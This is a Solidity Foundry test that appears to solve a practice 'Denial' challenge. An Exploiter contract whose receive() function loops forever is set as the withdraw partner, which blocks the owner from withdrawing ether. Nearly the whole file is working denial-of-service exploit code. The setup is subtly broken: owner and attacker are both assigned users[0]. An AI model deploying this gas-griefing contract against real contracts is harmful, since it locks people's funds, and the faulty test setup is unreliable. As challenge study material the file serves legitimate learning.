// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";
import {Denial} from "../src/Denial.sol";

contract DenialTest is Test {
    Utilities internal utils;
    Denial internal denial;

    address internal attacker;
    address internal owner;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);

        owner = users[0];
        vm.label(owner, "OwnerI");

        attacker = users[0];
        vm.label(attacker, "Attacker");

        vm.startPrank(owner);
        denial = new Denial{value: 2 ether}();
        vm.label(address(denial), "Denial");

        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Exploiter exploiter = new Exploiter();

        denial.setWithdrawPartner(address(exploiter));
        denial.withdraw();

        assertEq(owner.balance, 0);
        vm.stopPrank();
    }
}

contract Exploiter {
    uint sum;

    function withdraw(address _attacker) public {
        payable(_attacker).transfer(address(this).balance);
    }

    receive() external payable {
        while (true) {
            sum = sum + 1;
        }
    }
}
